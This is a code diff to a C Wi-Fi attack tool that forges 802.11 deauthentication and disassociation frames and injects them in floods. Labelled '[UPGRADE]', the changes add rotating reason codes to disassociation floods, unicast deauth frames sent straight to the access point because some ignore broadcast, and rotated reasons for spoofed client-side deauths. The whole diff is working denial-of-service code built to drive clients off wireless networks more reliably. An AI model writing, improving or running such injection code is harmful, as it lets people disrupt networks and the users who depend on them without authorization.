@@ -1510,7 +1510,8 @@ typedef struct {
   pkt_t deauth_fwd[N_REASONS];
   pkt_t deauth_rev[N_REASONS];
   pkt_t deauth_bcast;
-  pkt_t disassoc, disassoc_bcast;
+  pkt_t disassoc_fwd[N_REASONS];   /* [UPGRADE] Reason code rotation */
+  pkt_t disassoc_bcast;
   pkt_t eapol_logoff;
   pkt_t csa_action;
   pkt_t probe_resp;    /* unicast to client */
@@ -1566,10 +1567,11 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
         mk_deauth(f->deauth_fwd[i].buf, bss, cli, REASON_CODES[i], 0);
     f->deauth_rev[i].len =
         mk_deauth_rev(f->deauth_rev[i].buf, bss, cli, REASON_CODES[i], 0);
+    /* [UPGRADE] Disassoc also gets full reason code rotation */
+    f->disassoc_fwd[i].len =
+        mk_disassoc(f->disassoc_fwd[i].buf, bss, cli, REASON_CODES[i], 0);
   }
   f->deauth_bcast.len = mk_deauth(f->deauth_bcast.buf, bss, BCAST, 7, 0);
-
-  f->disassoc.len = mk_disassoc(f->disassoc.buf, bss, cli, 8, 0);
   f->disassoc_bcast.len = mk_disassoc(f->disassoc_bcast.buf, bss, BCAST, 8, 0);
 
   f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);
@@ -1642,7 +1644,9 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     s.p[s.n++] = &f->deauth_bcast;
     break;
   case VEC_DISASSOC_FLOOD:
-    s.p[s.n++] = &f->disassoc;
+    /* [UPGRADE] Reason code rotation for disassoc (matches deauth) */
+    for (int i = 0; i < N_REASONS && s.n < 30; i++)
+      s.p[s.n++] = &f->disassoc_fwd[i];
     s.p[s.n++] = &f->disassoc_bcast;
     break;
   case VEC_EAPOL_LOGOFF:
@@ -3883,11 +3887,21 @@ static void *stress_injector_thread(void *arg) {
           atomic_fetch_add(&g_pkts_fail, 1);
         }
 
-        /* Reverse deauth (client → AP spoof) - still dynamic due to random
-         * client mac */
+        /* [UPGRADE] Forward unicast deauth directly to BSSID (some APs ignore broadcast) */
+        uint16_t reason = REASON_CODES[seq % N_REASONS];
+        len = mk_deauth(tmp, bss, bss, reason, (seq++) & 0xFFF);
+        if (inject_one(sock, tmp, len) > 0) {
+          atomic_fetch_add(&g_pkts_sent, 1);
+          sent_for_ap++;
+        } else {
+          atomic_fetch_add(&g_pkts_fail, 1);
+        }
+
+        /* Reverse deauth (client → AP spoof) with rotated reason */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        len = mk_deauth_rev(tmp, bss, fake_cli, 6, (seq++) & 0xFFF);
+        uint16_t rev_reason = REASON_CODES[seq % N_REASONS];
+        len = mk_deauth_rev(tmp, bss, fake_cli, rev_reason, (seq++) & 0xFFF);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -3897,7 +3911,9 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_DISASSOC_FLOOD]) {
-        len = mk_disassoc(tmp, bss, BCAST, 8, seq++);
+        /* [UPGRADE] Reason code rotation for disassoc */
+        uint16_t dis_reason = REASON_CODES[seq % N_REASONS];
+        len = mk_disassoc(tmp, bss, BCAST, dis_reason, seq++);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
